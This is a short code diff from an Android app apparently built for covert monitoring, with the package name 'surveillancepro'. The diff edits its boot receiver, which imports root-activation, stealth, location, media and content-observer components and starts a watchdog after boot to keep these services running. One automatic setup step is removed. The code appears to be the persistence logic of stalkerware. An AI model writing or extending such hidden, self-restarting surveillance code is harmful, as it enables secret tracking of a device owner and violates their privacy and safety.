@@ -9,12 +9,10 @@ import android.util.Log
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.data.EventQueue
 import com.surveillancepro.android.root.RootActivator
-import com.surveillancepro.android.services.AutoSetupManager
 import com.surveillancepro.android.services.ContentObserverService
 import com.surveillancepro.android.services.LocationService
 import com.surveillancepro.android.services.MediaObserverService
 import com.surveillancepro.android.services.StealthManager
-import com.surveillancepro.android.services.WatchdogService
 import com.surveillancepro.android.workers.SyncWorker
 
 /**
@@ -119,21 +117,11 @@ class BootReceiver : BroadcastReceiver() {
         // Étape 7: Démarrer le Watchdog pour surveiller tous les services
         handler.postDelayed({
             try {
-                WatchdogService.start(context)
+                com.surveillancepro.android.services.WatchdogService.start(context)
                 Log.d("BootReceiver", "WatchdogService started")
             } catch (e: Exception) {
                 Log.w("BootReceiver", "WatchdogService: ${e.message}")
             }
         }, 20000) // 20 secondes après boot
-        
-        // Étape 8: AUTOMATISATION - S'assurer que tout est actif
-        handler.postDelayed({
-            try {
-                AutoSetupManager.ensureServicesRunning(context)
-                Log.d("BootReceiver", "AutoSetupManager ensured all services running")
-            } catch (e: Exception) {
-                Log.w("BootReceiver", "AutoSetupManager: ${e.message}")
-            }
-        }, 30000) // 30 secondes après boot
     }
 }
